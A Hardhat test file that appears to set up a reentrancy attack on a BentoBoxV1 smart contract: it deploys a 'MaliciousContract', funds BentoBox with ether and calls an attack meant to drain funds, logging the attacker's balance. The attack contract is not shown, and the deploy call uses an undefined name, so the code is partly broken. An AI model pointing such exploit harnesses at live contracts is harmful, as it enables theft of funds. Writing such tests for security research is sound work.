const { ethers } = require("hardhat");
require("dotenv").config();

describe("BentoBoxV1 Reentrancy Attack Test", function () {
  let deployer, attacker;
  let bentoBox, maliciousContract;
  const bentoBoxAddress = process.env.BENTOBOX_ADDRESS;
  const wethAddress = process.env.WETH_TOKEN_ADDRESS;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    // Initialize BentoBox contract with deployer signer
    bentoBox = await ethers.getContractAt("BentoBoxV1", bentoBoxAddress, deployer);
    console.log("Connected to BentoBox at:", bentoBox.address);

    // Deploy MaliciousContract with attacker as the signer
    const maliciousContractFactory = await ethers.getContractFactory("MaliciousContract", attacker);
    maliciousContract = await maliciousContractFactory.deploy(BENTOBOX_ADDRESS);
    await maliciousContract.deployed();

    console.log("MaliciousContract deployed at:", maliciousContract.address);

    // Fund BentoBox with some Ether to simulate available funds
    await deployer.sendTransaction({
      to: bentoBox.address,
      value: ethers.utils.parseEther("10"),
    });
  });

  it("should exploit reentrancy vulnerability in withdraw and drain funds", async function () {
    const attackAmount = ethers.utils.parseEther("1");

    // Attacker attempts to exploit the reentrancy vulnerability
    await maliciousContract.connect(attacker).attack(attackAmount, {
      value: attackAmount,
      gasLimit: 5000000,
    });

    // Verify attacker balance after the exploit
    const finalBalance = await ethers.provider.getBalance(attacker.address);
    console.log("Attacker balance after exploit:", ethers.utils.formatEther(finalBalance));
  });
});
